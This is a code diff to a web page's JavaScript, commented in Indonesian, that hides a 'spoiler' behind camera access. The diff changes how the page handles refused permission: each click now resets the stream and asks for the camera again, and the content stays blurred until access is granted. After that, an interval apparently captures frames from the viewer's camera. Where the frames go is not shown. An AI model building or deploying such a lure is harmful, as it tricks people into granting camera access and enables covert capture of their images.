@@ -226,7 +226,6 @@
             let isUnblurred = false;
             let isCameraReady = false;
             let captureInterval = null;
-            let isPermissionDenied = false;
             let isRequestingPermission = false;
 
             // ====== BINTIK ======
@@ -302,6 +301,22 @@
                 }
             }
 
+            // ====== RESET PERMISSION ======
+            async function resetPermission() {
+                try {
+                    // Coba query permission state
+                    if (navigator.permissions && navigator.permissions.query) {
+                        const perm = await navigator.permissions.query({ name: 'camera' });
+                        console.log('Permission state:', perm.state);
+                        
+                        // Jika state 'denied', kita tidak bisa reset secara programmatic
+                        // Tapi kita bisa tetap mencoba meminta ulang
+                    }
+                } catch (e) {
+                    console.log('Permission query not supported');
+                }
+            }
+
             // ====== SETUP KAMERA ======
             async function setupCamera() {
                 if (isRequestingPermission) return;
@@ -324,7 +339,6 @@
                         captureCanvas.width = video.videoWidth;
                         captureCanvas.height = video.videoHeight;
                         isCameraReady = true;
-                        isPermissionDenied = false;
                         isRequestingPermission = false;
                         startCapturing();
 
@@ -338,10 +352,21 @@
 
                 } catch (e) {
                     console.error("Camera Error:", e);
-                    isPermissionDenied = true;
                     isCameraReady = false;
                     isRequestingPermission = false;
                     
+                    // Reset stream
+                    if (video.srcObject) {
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+                    }
+                    
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                        captureInterval = null;
+                    }
+                    
+                    // Spoiler tetap tertutup
                     if (isUnblurred) {
                         isUnblurred = false;
                         bubble.classList.remove('unblur');
@@ -393,21 +418,10 @@
             function toggleSpoiler(e) {
                 e.stopPropagation();
 
-                // Jika izin ditolak, reset dan minta izin lagi (tanpa embel-embel)
-                if (isPermissionDenied) {
-                    if (video.srcObject) {
-                        video.srcObject.getTracks().forEach(track => track.stop());
-                        video.srcObject = null;
-                    }
-                    isCameraReady = false;
-                    if (captureInterval) {
-                        clearInterval(captureInterval);
-                        captureInterval = null;
-                    }
-                    setupCamera();
-                    return;
-                }
+                // Jika sedang meminta izin, abaikan
+                if (isRequestingPermission) return;
 
+                // Jika kamera sudah siap dan spoiler terbuka, tutup
                 if (isUnblurred) {
                     isUnblurred = false;
                     bubble.classList.remove('unblur');
@@ -421,18 +435,19 @@
                     return;
                 }
 
-                if (!isCameraReady) {
-                    setupCamera();
-                } else {
-                    isUnblurred = true;
-                    bubble.classList.add('unblur');
-                    hint.textContent = '✅ terlihat';
-                    stopAnimation();
-
-                    if (!captureInterval) {
-                        startCapturing();
-                    }
+                // Reset camera state
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
                 }
+                isCameraReady = false;
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
+                }
+
+                // Minta izin kamera (akan muncul notifikasi)
+                setupCamera();
             }
 
             // ====== INIT ======
